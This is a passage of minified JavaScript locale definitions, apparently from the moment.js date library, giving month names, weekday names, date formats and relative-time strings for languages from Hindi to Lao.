        meridiemParse: /אחה"צ|לפנה"צ|אחרי הצהריים|לפני הצהריים|לפנות בוקר|בבוקר|בערב/i,
        isPM: function(e) {
            return /^(אחה"צ|אחרי הצהריים|בערב)$/.test(e)
        },
        meridiem: function(e, t, n) {
            return e < 5 ? "לפנות בוקר" : e < 10 ? "בבוקר" : e < 12 ? n ? 'לפנה"צ' : "לפני הצהריים" : e < 18 ? n ? 'אחה"צ' : "אחרי הצהריים" : "בערב"
        }
    });
    var Gi = {
        1: "१",
        2: "२",
        3: "३",
        4: "४",
        5: "५",
        6: "६",
        7: "७",
        8: "८",
        9: "९",
        0: "०"
    }
      , Xi = {
        "१": "1",
        "२": "2",
        "३": "3",
        "४": "4",
        "५": "5",
        "६": "6",
        "७": "7",
        "८": "8",
        "९": "9",
        "०": "0"
    };
    _.defineLocale("hi", {
        months: "जनवरी_फ़रवरी_मार्च_अप्रैल_मई_जून_जुलाई_अगस्त_सितम्बर_अक्टूबर_नवम्बर_दिसम्बर".split("_"),
        monthsShort: "जन._फ़र._मार्च_अप्रै._मई_जून_जुल._अग._सित._अक्टू._नव._दिस.".split("_"),
        monthsParseExact: !0,
        weekdays: "रविवार_सोमवार_मंगलवार_बुधवार_गुरूवार_शुक्रवार_शनिवार".split("_"),
        weekdaysShort: "रवि_सोम_मंगल_बुध_गुरू_शुक्र_शनि".split("_"),
        weekdaysMin: "र_सो_मं_बु_गु_शु_श".split("_"),
        longDateFormat: {
            LT: "A h:mm बजे",
            LTS: "A h:mm:ss बजे",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY, A h:mm बजे",
            LLLL: "dddd, D MMMM YYYY, A h:mm बजे"
        },
        calendar: {
            sameDay: "[आज] LT",
            nextDay: "[कल] LT",
            nextWeek: "dddd, LT",
            lastDay: "[कल] LT",
            lastWeek: "[पिछले] dddd, LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s में",
            past: "%s पहले",
            s: "कुछ ही क्षण",
            m: "एक मिनट",
            mm: "%d मिनट",
            h: "एक घंटा",
            hh: "%d घंटे",
            d: "एक दिन",
            dd: "%d दिन",
            M: "एक महीने",
            MM: "%d महीने",
            y: "एक वर्ष",
            yy: "%d वर्ष"
        },
        preparse: function(e) {
            return e.replace(/[१२३४५६७८९०]/g, function(e) {
                return Xi[e]
            })
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return Gi[e]
            })
        },
        meridiemParse: /रात|सुबह|दोपहर|शाम/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "रात" === t ? e < 4 ? e : e + 12 : "सुबह" === t ? e : "दोपहर" === t ? 10 <= e ? e : e + 12 : "शाम" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "रात" : e < 10 ? "सुबह" : e < 17 ? "दोपहर" : e < 20 ? "शाम" : "रात"
        },
        week: {
            dow: 0,
            doy: 6
        }
    }),
    _.defineLocale("hr", {
        months: {
            format: "siječnja_veljače_ožujka_travnja_svibnja_lipnja_srpnja_kolovoza_rujna_listopada_studenoga_prosinca".split("_"),
            standalone: "siječanj_veljača_ožujak_travanj_svibanj_lipanj_srpanj_kolovoz_rujan_listopad_studeni_prosinac".split("_")
        },
        monthsShort: "sij._velj._ožu._tra._svi._lip._srp._kol._ruj._lis._stu._pro.".split("_"),
        monthsParseExact: !0,
        weekdays: "nedjelja_ponedjeljak_utorak_srijeda_četvrtak_petak_subota".split("_"),
        weekdaysShort: "ned._pon._uto._sri._čet._pet._sub.".split("_"),
        weekdaysMin: "ne_po_ut_sr_če_pe_su".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm",
            LLLL: "dddd, D. MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[danas u] LT",
            nextDay: "[sutra u] LT",
            nextWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[u] [nedjelju] [u] LT";
                case 3:
                    return "[u] [srijedu] [u] LT";
                case 6:
                    return "[u] [subotu] [u] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[u] dddd [u] LT"
                }
            },
            lastDay: "[jučer u] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                case 3:
                    return "[prošlu] dddd [u] LT";
                case 6:
                    return "[prošle] [subote] [u] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[prošli] dddd [u] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "za %s",
            past: "prije %s",
            s: "par sekundi",
            m: et,
            mm: et,
            h: et,
            hh: et,
            d: "dan",
            dd: et,
            M: "mjesec",
            MM: et,
            y: "godinu",
            yy: et
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 7
        }
    });
    var Ki = "vasárnap hétfőn kedden szerdán csütörtökön pénteken szombaton".split(" ");
    _.defineLocale("hu", {
        months: "január_február_március_április_május_június_július_augusztus_szeptember_október_november_december".split("_"),
        monthsShort: "jan_feb_márc_ápr_máj_jún_júl_aug_szept_okt_nov_dec".split("_"),
        weekdays: "vasárnap_hétfő_kedd_szerda_csütörtök_péntek_szombat".split("_"),
        weekdaysShort: "vas_hét_kedd_sze_csüt_pén_szo".split("_"),
        weekdaysMin: "v_h_k_sze_cs_p_szo".split("_"),
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "YYYY.MM.DD.",
            LL: "YYYY. MMMM D.",
            LLL: "YYYY. MMMM D. H:mm",
            LLLL: "YYYY. MMMM D., dddd H:mm"
        },
        meridiemParse: /de|du/i,
        isPM: function(e) {
            return "u" === e.charAt(1).toLowerCase()
        },
        meridiem: function(e, t, n) {
            return e < 12 ? !0 === n ? "de" : "DE" : !0 === n ? "du" : "DU"
        },
        calendar: {
            sameDay: "[ma] LT[-kor]",
            nextDay: "[holnap] LT[-kor]",
            nextWeek: function() {
                return nt.call(this, !0)
            },
            lastDay: "[tegnap] LT[-kor]",
            lastWeek: function() {
                return nt.call(this, !1)
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "%s múlva",
            past: "%s",
            s: tt,
            m: tt,
            mm: tt,
            h: tt,
            hh: tt,
            d: tt,
            dd: tt,
            M: tt,
            MM: tt,
            y: tt,
            yy: tt
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("hy-am", {
        months: {
            format: "հունվարի_փետրվարի_մարտի_ապրիլի_մայիսի_հունիսի_հուլիսի_օգոստոսի_սեպտեմբերի_հոկտեմբերի_նոյեմբերի_դեկտեմբերի".split("_"),
            standalone: "հունվար_փետրվար_մարտ_ապրիլ_մայիս_հունիս_հուլիս_օգոստոս_սեպտեմբեր_հոկտեմբեր_նոյեմբեր_դեկտեմբեր".split("_")
        },
        monthsShort: "հնվ_փտր_մրտ_ապր_մյս_հնս_հլս_օգս_սպտ_հկտ_նմբ_դկտ".split("_"),
        weekdays: "կիրակի_երկուշաբթի_երեքշաբթի_չորեքշաբթի_հինգշաբթի_ուրբաթ_շաբաթ".split("_"),
        weekdaysShort: "կրկ_երկ_երք_չրք_հնգ_ուրբ_շբթ".split("_"),
        weekdaysMin: "կրկ_երկ_երք_չրք_հնգ_ուրբ_շբթ".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY թ.",
            LLL: "D MMMM YYYY թ., HH:mm",
            LLLL: "dddd, D MMMM YYYY թ., HH:mm"
        },
        calendar: {
            sameDay: "[այսօր] LT",
            nextDay: "[վաղը] LT",
            lastDay: "[երեկ] LT",
            nextWeek: function() {
                return "dddd [օրը ժամը] LT"
            },
            lastWeek: function() {
                return "[անցած] dddd [օրը ժամը] LT"
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "%s հետո",
            past: "%s առաջ",
            s: "մի քանի վայրկյան",
            m: "րոպե",
            mm: "%d րոպե",
            h: "ժամ",
            hh: "%d ժամ",
            d: "օր",
            dd: "%d օր",
            M: "ամիս",
            MM: "%d ամիս",
            y: "տարի",
            yy: "%d տարի"
        },
        meridiemParse: /գիշերվա|առավոտվա|ցերեկվա|երեկոյան/,
        isPM: function(e) {
            return /^(ցերեկվա|երեկոյան)$/.test(e)
        },
        meridiem: function(e) {
            return e < 4 ? "գիշերվա" : e < 12 ? "առավոտվա" : e < 17 ? "ցերեկվա" : "երեկոյան"
        },
        ordinalParse: /\d{1,2}|\d{1,2}-(ին|րդ)/,
        ordinal: function(e, t) {
            switch (t) {
            case "DDD":
            case "w":
            case "W":
            case "DDDo":
                return 1 === e ? e + "-ին" : e + "-րդ";
            default:
                return e
            }
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("id", {
        months: "Januari_Februari_Maret_April_Mei_Juni_Juli_Agustus_September_Oktober_November_Desember".split("_"),
        monthsShort: "Jan_Feb_Mar_Apr_Mei_Jun_Jul_Ags_Sep_Okt_Nov_Des".split("_"),
        weekdays: "Minggu_Senin_Selasa_Rabu_Kamis_Jumat_Sabtu".split("_"),
        weekdaysShort: "Min_Sen_Sel_Rab_Kam_Jum_Sab".split("_"),
        weekdaysMin: "Mg_Sn_Sl_Rb_Km_Jm_Sb".split("_"),
        longDateFormat: {
            LT: "HH.mm",
            LTS: "HH.mm.ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY [pukul] HH.mm",
            LLLL: "dddd, D MMMM YYYY [pukul] HH.mm"
        },
        meridiemParse: /pagi|siang|sore|malam/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "pagi" === t ? e : "siang" === t ? 11 <= e ? e : e + 12 : "sore" === t || "malam" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            return e < 11 ? "pagi" : e < 15 ? "siang" : e < 19 ? "sore" : "malam"
        },
        calendar: {
            sameDay: "[Hari ini pukul] LT",
            nextDay: "[Besok pukul] LT",
            nextWeek: "dddd [pukul] LT",
            lastDay: "[Kemarin pukul] LT",
            lastWeek: "dddd [lalu pukul] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "dalam %s",
            past: "%s yang lalu",
            s: "beberapa detik",
            m: "semenit",
            mm: "%d menit",
            h: "sejam",
            hh: "%d jam",
            d: "sehari",
            dd: "%d hari",
            M: "sebulan",
            MM: "%d bulan",
            y: "setahun",
            yy: "%d tahun"
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("is", {
        months: "janúar_febrúar_mars_apríl_maí_júní_júlí_ágúst_september_október_nóvember_desember".split("_"),
        monthsShort: "jan_feb_mar_apr_maí_jún_júl_ágú_sep_okt_nóv_des".split("_"),
        weekdays: "sunnudagur_mánudagur_þriðjudagur_miðvikudagur_fimmtudagur_föstudagur_laugardagur".split("_"),
        weekdaysShort: "sun_mán_þri_mið_fim_fös_lau".split("_"),
        weekdaysMin: "Su_Má_Þr_Mi_Fi_Fö_La".split("_"),
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY [kl.] H:mm",
            LLLL: "dddd, D. MMMM YYYY [kl.] H:mm"
        },
        calendar: {
            sameDay: "[í dag kl.] LT",
            nextDay: "[á morgun kl.] LT",
            nextWeek: "dddd [kl.] LT",
            lastDay: "[í gær kl.] LT",
            lastWeek: "[síðasta] dddd [kl.] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "eftir %s",
            past: "fyrir %s síðan",
            s: at,
            m: at,
            mm: at,
            h: "klukkustund",
            hh: at,
            d: at,
            dd: at,
            M: at,
            MM: at,
            y: at,
            yy: at
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("it", {
        months: "gennaio_febbraio_marzo_aprile_maggio_giugno_luglio_agosto_settembre_ottobre_novembre_dicembre".split("_"),
        monthsShort: "gen_feb_mar_apr_mag_giu_lug_ago_set_ott_nov_dic".split("_"),
        weekdays: "Domenica_Lunedì_Martedì_Mercoledì_Giovedì_Venerdì_Sabato".split("_"),
        weekdaysShort: "Dom_Lun_Mar_Mer_Gio_Ven_Sab".split("_"),
        weekdaysMin: "Do_Lu_Ma_Me_Gi_Ve_Sa".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Oggi alle] LT",
            nextDay: "[Domani alle] LT",
            nextWeek: "dddd [alle] LT",
            lastDay: "[Ieri alle] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[la scorsa] dddd [alle] LT";
                default:
                    return "[lo scorso] dddd [alle] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: function(e) {
                return (/^[0-9].+$/.test(e) ? "tra" : "in") + " " + e
            },
            past: "%s fa",
            s: "alcuni secondi",
            m: "un minuto",
            mm: "%d minuti",
            h: "un'ora",
            hh: "%d ore",
            d: "un giorno",
            dd: "%d giorni",
            M: "un mese",
            MM: "%d mesi",
            y: "un anno",
            yy: "%d anni"
        },
        ordinalParse: /\d{1,2}º/,
        ordinal: "%dº",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("ja", {
        months: "1月_2月_3月_4月_5月_6月_7月_8月_9月_10月_11月_12月".split("_"),
        monthsShort: "1月_2月_3月_4月_5月_6月_7月_8月_9月_10月_11月_12月".split("_"),
        weekdays: "日曜日_月曜日_火曜日_水曜日_木曜日_金曜日_土曜日".split("_"),
        weekdaysShort: "日_月_火_水_木_金_土".split("_"),
        weekdaysMin: "日_月_火_水_木_金_土".split("_"),
        longDateFormat: {
            LT: "Ah時m分",
            LTS: "Ah時m分s秒",
            L: "YYYY/MM/DD",
            LL: "YYYY年M月D日",
            LLL: "YYYY年M月D日Ah時m分",
            LLLL: "YYYY年M月D日Ah時m分 dddd"
        },
        meridiemParse: /午前|午後/i,
        isPM: function(e) {
            return "午後" === e
        },
        meridiem: function(e, t, n) {
            return e < 12 ? "午前" : "午後"
        },
        calendar: {
            sameDay: "[今日] LT",
            nextDay: "[明日] LT",
            nextWeek: "[来週]dddd LT",
            lastDay: "[昨日] LT",
            lastWeek: "[前週]dddd LT",
            sameElse: "L"
        },
        ordinalParse: /\d{1,2}日/,
        ordinal: function(e, t) {
            switch (t) {
            case "d":
            case "D":
            case "DDD":
                return e + "日";
            default:
                return e
            }
        },
        relativeTime: {
            future: "%s後",
            past: "%s前",
            s: "数秒",
            m: "1分",
            mm: "%d分",
            h: "1時間",
            hh: "%d時間",
            d: "1日",
            dd: "%d日",
            M: "1ヶ月",
            MM: "%dヶ月",
            y: "1年",
            yy: "%d年"
        }
    }),
    _.defineLocale("jv", {
        months: "Januari_Februari_Maret_April_Mei_Juni_Juli_Agustus_September_Oktober_Nopember_Desember".split("_"),
        monthsShort: "Jan_Feb_Mar_Apr_Mei_Jun_Jul_Ags_Sep_Okt_Nop_Des".split("_"),
        weekdays: "Minggu_Senen_Seloso_Rebu_Kemis_Jemuwah_Septu".split("_"),
        weekdaysShort: "Min_Sen_Sel_Reb_Kem_Jem_Sep".split("_"),
        weekdaysMin: "Mg_Sn_Sl_Rb_Km_Jm_Sp".split("_"),
        longDateFormat: {
            LT: "HH.mm",
            LTS: "HH.mm.ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY [pukul] HH.mm",
            LLLL: "dddd, D MMMM YYYY [pukul] HH.mm"
        },
        meridiemParse: /enjing|siyang|sonten|ndalu/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "enjing" === t ? e : "siyang" === t ? 11 <= e ? e : e + 12 : "sonten" === t || "ndalu" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            return e < 11 ? "enjing" : e < 15 ? "siyang" : e < 19 ? "sonten" : "ndalu"
        },
        calendar: {
            sameDay: "[Dinten puniko pukul] LT",
            nextDay: "[Mbenjang pukul] LT",
            nextWeek: "dddd [pukul] LT",
            lastDay: "[Kala wingi pukul] LT",
            lastWeek: "dddd [kepengker pukul] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "wonten ing %s",
            past: "%s ingkang kepengker",
            s: "sawetawis detik",
            m: "setunggal menit",
            mm: "%d menit",
            h: "setunggal jam",
            hh: "%d jam",
            d: "sedinten",
            dd: "%d dinten",
            M: "sewulan",
            MM: "%d wulan",
            y: "setaun",
            yy: "%d taun"
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("ka", {
        months: {
            standalone: "იანვარი_თებერვალი_მარტი_აპრილი_მაისი_ივნისი_ივლისი_აგვისტო_სექტემბერი_ოქტომბერი_ნოემბერი_დეკემბერი".split("_"),
            format: "იანვარს_თებერვალს_მარტს_აპრილის_მაისს_ივნისს_ივლისს_აგვისტს_სექტემბერს_ოქტომბერს_ნოემბერს_დეკემბერს".split("_")
        },
        monthsShort: "იან_თებ_მარ_აპრ_მაი_ივნ_ივლ_აგვ_სექ_ოქტ_ნოე_დეკ".split("_"),
        weekdays: {
            standalone: "კვირა_ორშაბათი_სამშაბათი_ოთხშაბათი_ხუთშაბათი_პარასკევი_შაბათი".split("_"),
            format: "კვირას_ორშაბათს_სამშაბათს_ოთხშაბათს_ხუთშაბათს_პარასკევს_შაბათს".split("_"),
            isFormat: /(წინა|შემდეგ)/
        },
        weekdaysShort: "კვი_ორშ_სამ_ოთხ_ხუთ_პარ_შაბ".split("_"),
        weekdaysMin: "კვ_ორ_სა_ოთ_ხუ_პა_შა".split("_"),
        longDateFormat: {
            LT: "h:mm A",
            LTS: "h:mm:ss A",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY h:mm A",
            LLLL: "dddd, D MMMM YYYY h:mm A"
        },
        calendar: {
            sameDay: "[დღეს] LT[-ზე]",
            nextDay: "[ხვალ] LT[-ზე]",
            lastDay: "[გუშინ] LT[-ზე]",
            nextWeek: "[შემდეგ] dddd LT[-ზე]",
            lastWeek: "[წინა] dddd LT-ზე",
            sameElse: "L"
        },
        relativeTime: {
            future: function(e) {
                return /(წამი|წუთი|საათი|წელი)/.test(e) ? e.replace(/ი$/, "ში") : e + "ში"
            },
            past: function(e) {
                return /(წამი|წუთი|საათი|დღე|თვე)/.test(e) ? e.replace(/(ი|ე)$/, "ის წინ") : /წელი/.test(e) ? e.replace(/წელი$/, "წლის წინ") : void 0
            },
            s: "რამდენიმე წამი",
            m: "წუთი",
            mm: "%d წუთი",
            h: "საათი",
            hh: "%d საათი",
            d: "დღე",
            dd: "%d დღე",
            M: "თვე",
            MM: "%d თვე",
            y: "წელი",
            yy: "%d წელი"
        },
        ordinalParse: /0|1-ლი|მე-\d{1,2}|\d{1,2}-ე/,
        ordinal: function(e) {
            return 0 === e ? e : 1 === e ? e + "-ლი" : e < 20 || e <= 100 && e % 20 == 0 || e % 100 == 0 ? "მე-" + e : e + "-ე"
        },
        week: {
            dow: 1,
            doy: 7
        }
    });
    var Qi = {
        0: "-ші",
        1: "-ші",
        2: "-ші",
        3: "-ші",
        4: "-ші",
        5: "-ші",
        6: "-шы",
        7: "-ші",
        8: "-ші",
        9: "-шы",
        10: "-шы",
        20: "-шы",
        30: "-шы",
        40: "-шы",
        50: "-ші",
        60: "-шы",
        70: "-ші",
        80: "-ші",
        90: "-шы",
        100: "-ші"
    };
    _.defineLocale("kk", {
        months: "қаңтар_ақпан_наурыз_сәуір_мамыр_маусым_шілде_тамыз_қыркүйек_қазан_қараша_желтоқсан".split("_"),
        monthsShort: "қаң_ақп_нау_сәу_мам_мау_шіл_там_қыр_қаз_қар_жел".split("_"),
        weekdays: "жексенбі_дүйсенбі_сейсенбі_сәрсенбі_бейсенбі_жұма_сенбі".split("_"),
        weekdaysShort: "жек_дүй_сей_сәр_бей_жұм_сен".split("_"),
        weekdaysMin: "жк_дй_сй_ср_бй_жм_сн".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Бүгін сағат] LT",
            nextDay: "[Ертең сағат] LT",
            nextWeek: "dddd [сағат] LT",
            lastDay: "[Кеше сағат] LT",
            lastWeek: "[Өткен аптаның] dddd [сағат] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s ішінде",
            past: "%s бұрын",
            s: "бірнеше секунд",
            m: "бір минут",
            mm: "%d минут",
            h: "бір сағат",
            hh: "%d сағат",
            d: "бір күн",
            dd: "%d күн",
            M: "бір ай",
            MM: "%d ай",
            y: "бір жыл",
            yy: "%d жыл"
        },
        ordinalParse: /\d{1,2}-(ші|шы)/,
        ordinal: function(e) {
            return e + (Qi[e] || Qi[e % 10] || Qi[100 <= e ? 100 : null])
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("km", {
        months: "មករា_កុម្ភៈ_មីនា_មេសា_ឧសភា_មិថុនា_កក្កដា_សីហា_កញ្ញា_តុលា_វិច្ឆិកា_ធ្នូ".split("_"),
        monthsShort: "មករា_កុម្ភៈ_មីនា_មេសា_ឧសភា_មិថុនា_កក្កដា_សីហា_កញ្ញា_តុលា_វិច្ឆិកា_ធ្នូ".split("_"),
        weekdays: "អាទិត្យ_ច័ន្ទ_អង្គារ_ពុធ_ព្រហស្បតិ៍_សុក្រ_សៅរ៍".split("_"),
        weekdaysShort: "អាទិត្យ_ច័ន្ទ_អង្គារ_ពុធ_ព្រហស្បតិ៍_សុក្រ_សៅរ៍".split("_"),
        weekdaysMin: "អាទិត្យ_ច័ន្ទ_អង្គារ_ពុធ_ព្រហស្បតិ៍_សុក្រ_សៅរ៍".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[ថ្ងៃនេះ ម៉ោង] LT",
            nextDay: "[ស្អែក ម៉ោង] LT",
            nextWeek: "dddd [ម៉ោង] LT",
            lastDay: "[ម្សិលមិញ ម៉ោង] LT",
            lastWeek: "dddd [សប្តាហ៍មុន] [ម៉ោង] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%sទៀត",
            past: "%sមុន",
            s: "ប៉ុន្មានវិនាទី",
            m: "មួយនាទី",
            mm: "%d នាទី",
            h: "មួយម៉ោង",
            hh: "%d ម៉ោង",
            d: "មួយថ្ងៃ",
            dd: "%d ថ្ងៃ",
            M: "មួយខែ",
            MM: "%d ខែ",
            y: "មួយឆ្នាំ",
            yy: "%d ឆ្នាំ"
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("ko", {
        months: "1월_2월_3월_4월_5월_6월_7월_8월_9월_10월_11월_12월".split("_"),
        monthsShort: "1월_2월_3월_4월_5월_6월_7월_8월_9월_10월_11월_12월".split("_"),
        weekdays: "일요일_월요일_화요일_수요일_목요일_금요일_토요일".split("_"),
        weekdaysShort: "일_월_화_수_목_금_토".split("_"),
        weekdaysMin: "일_월_화_수_목_금_토".split("_"),
        longDateFormat: {
            LT: "A h시 m분",
            LTS: "A h시 m분 s초",
            L: "YYYY.MM.DD",
            LL: "YYYY년 MMMM D일",
            LLL: "YYYY년 MMMM D일 A h시 m분",
            LLLL: "YYYY년 MMMM D일 dddd A h시 m분"
        },
        calendar: {
            sameDay: "오늘 LT",
            nextDay: "내일 LT",
            nextWeek: "dddd LT",
            lastDay: "어제 LT",
            lastWeek: "지난주 dddd LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s 후",
            past: "%s 전",
            s: "몇 초",
            ss: "%d초",
            m: "일분",
            mm: "%d분",
            h: "한 시간",
            hh: "%d시간",
            d: "하루",
            dd: "%d일",
            M: "한 달",
            MM: "%d달",
            y: "일 년",
            yy: "%d년"
        },
        ordinalParse: /\d{1,2}일/,
        ordinal: "%d일",
        meridiemParse: /오전|오후/,
        isPM: function(e) {
            return "오후" === e
        },
        meridiem: function(e, t, n) {
            return e < 12 ? "오전" : "오후"
        }
    });
    var Zi = {
        0: "-чү",
        1: "-чи",
        2: "-чи",
        3: "-чү",
        4: "-чү",
        5: "-чи",
        6: "-чы",
        7: "-чи",
        8: "-чи",
        9: "-чу",
        10: "-чу",
        20: "-чы",
        30: "-чу",
        40: "-чы",
        50: "-чү",
        60: "-чы",
        70: "-чи",
        80: "-чи",
        90: "-чу",
        100: "-чү"
    };
    _.defineLocale("ky", {
        months: "январь_февраль_март_апрель_май_июнь_июль_август_сентябрь_октябрь_ноябрь_декабрь".split("_"),
        monthsShort: "янв_фев_март_апр_май_июнь_июль_авг_сен_окт_ноя_дек".split("_"),
        weekdays: "Жекшемби_Дүйшөмбү_Шейшемби_Шаршемби_Бейшемби_Жума_Ишемби".split("_"),
        weekdaysShort: "Жек_Дүй_Шей_Шар_Бей_Жум_Ише".split("_"),
        weekdaysMin: "Жк_Дй_Шй_Шр_Бй_Жм_Иш".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Бүгүн саат] LT",
            nextDay: "[Эртең саат] LT",
            nextWeek: "dddd [саат] LT",
            lastDay: "[Кече саат] LT",
            lastWeek: "[Өткен аптанын] dddd [күнү] [саат] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s ичинде",
            past: "%s мурун",
            s: "бирнече секунд",
            m: "бир мүнөт",
            mm: "%d мүнөт",
            h: "бир саат",
            hh: "%d саат",
            d: "бир күн",
            dd: "%d күн",
            M: "бир ай",
            MM: "%d ай",
            y: "бир жыл",
            yy: "%d жыл"
        },
        ordinalParse: /\d{1,2}-(чи|чы|чү|чу)/,
        ordinal: function(e) {
            return e + (Zi[e] || Zi[e % 10] || Zi[100 <= e ? 100 : null])
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("lb", {
        months: "Januar_Februar_Mäerz_Abrëll_Mee_Juni_Juli_August_September_Oktober_November_Dezember".split("_"),
        monthsShort: "Jan._Febr._Mrz._Abr._Mee_Jun._Jul._Aug._Sept._Okt._Nov._Dez.".split("_"),
        monthsParseExact: !0,
        weekdays: "Sonndeg_Méindeg_Dënschdeg_Mëttwoch_Donneschdeg_Freideg_Samschdeg".split("_"),
        weekdaysShort: "So._Mé._Dë._Më._Do._Fr._Sa.".split("_"),
        weekdaysMin: "So_Mé_Dë_Më_Do_Fr_Sa".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm [Auer]",
            LTS: "H:mm:ss [Auer]",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm [Auer]",
            LLLL: "dddd, D. MMMM YYYY H:mm [Auer]"
        },
        calendar: {
            sameDay: "[Haut um] LT",
            sameElse: "L",
            nextDay: "[Muer um] LT",
            nextWeek: "dddd [um] LT",
            lastDay: "[Gëschter um] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 2:
                case 4:
                    return "[Leschten] dddd [um] LT";
                default:
                    return "[Leschte] dddd [um] LT"
                }
            }
        },
        relativeTime: {
            future: function(e) {
                return rt(e.substr(0, e.indexOf(" "))) ? "a " + e : "an " + e
            },
            past: function(e) {
                return rt(e.substr(0, e.indexOf(" "))) ? "viru " + e : "virun " + e
            },
            s: "e puer Sekonnen",
            m: st,
            mm: "%d Minutten",
            h: st,
            hh: "%d Stonnen",
            d: st,
            dd: "%d Deeg",
            M: st,
            MM: "%d Méint",
            y: st,
            yy: "%d Joer"
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("lo", {
        months: "ມັງກອນ_ກຸມພາ_ມີນາ_ເມສາ_ພຶດສະພາ_ມິຖຸນາ_ກໍລະກົດ_ສິງຫາ_ກັນຍາ_ຕຸລາ_ພະຈິກ_ທັນວາ".split("_"),
        monthsShort: "ມັງກອນ_ກຸມພາ_ມີນາ_ເມສາ_ພຶດສະພາ_ມິຖຸນາ_ກໍລະກົດ_ສິງຫາ_ກັນຍາ_ຕຸລາ_ພະຈິກ_ທັນວາ".split("_"),
        weekdays: "ອາທິດ_ຈັນ_ອັງຄານ_ພຸດ_ພະຫັດ_ສຸກ_ເສົາ".split("_"),
        weekdaysShort: "ທິດ_ຈັນ_ອັງຄານ_ພຸດ_ພະຫັດ_ສຸກ_ເສົາ".split("_"),
        weekdaysMin: "ທ_ຈ_ອຄ_ພ_ພຫ_ສກ_ສ".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "ວັນdddd D MMMM YYYY HH:mm"
        },
        meridiemParse: /ຕອນເຊົ້າ|ຕອນແລງ/,
        isPM: function(e) {
            return "ຕອນແລງ" === e
        },
        meridiem: function(e, t, n) {
